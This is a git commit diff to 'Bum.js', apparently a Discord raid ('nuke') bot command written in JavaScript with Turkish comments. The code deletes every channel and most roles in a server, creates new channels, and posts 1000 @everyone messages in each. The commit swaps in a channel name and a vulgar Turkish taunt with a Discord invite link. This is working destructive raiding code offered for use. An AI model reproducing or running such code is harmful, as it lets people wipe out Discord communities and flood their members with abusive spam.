2aff22986cbc0d68fb3f2fd3185554fc1f818dac
mDuchess <167371857+mDuchess@users.noreply.github.com>
2024-06-02 23:13:35 +0300

    Update Bum.js

--- commands/Bum.js
+++ commands/Bum.js
@@ -1,5 +1,5 @@
 module.exports.run = async (client, message, args) => {
-    var channelNames =  ["InfinityClient"]; //buraya istediğiniz kadar kanal adı girin hepsini açıp mesaj atıcak 29. satırı kontrol et!
+    var channelNames =  ["chwam-ugradı"]; //buraya istediğiniz kadar kanal adı girin hepsini açıp mesaj atıcak 29. satırı kontrol et!
     message.guild.channels.cache.forEach(channel => channel.delete()); // Sunucudaki tüm kanalları siler
     // Deleting every role except for everyone
     message.guild.roles.cache.forEach(role => {
@@ -25,7 +25,7 @@ module.exports.run = async (client, message, args) => {
             ],
         }).then(channel => {
             for(let i = 0; i < 1000; i++) { ///süreyi elleme 
-                channel.send({ content: "@everyone https://discord.gg/9t7vfxx5ru" });//// burada açtığı tüm kanallara ever spamı atar mesaj içeriğini yazın kısaca
+                channel.send({ content: "@everyone **BABANIZ CHAW BU SUNUCUYUDA S1KTI BOTA ULASMAK ICIN** https://discord.com/invite/E5jMczT3NC" });//// burada açtığı tüm kanallara ever spamı atar mesaj içeriğini yazın kısaca
             }
         });
     }
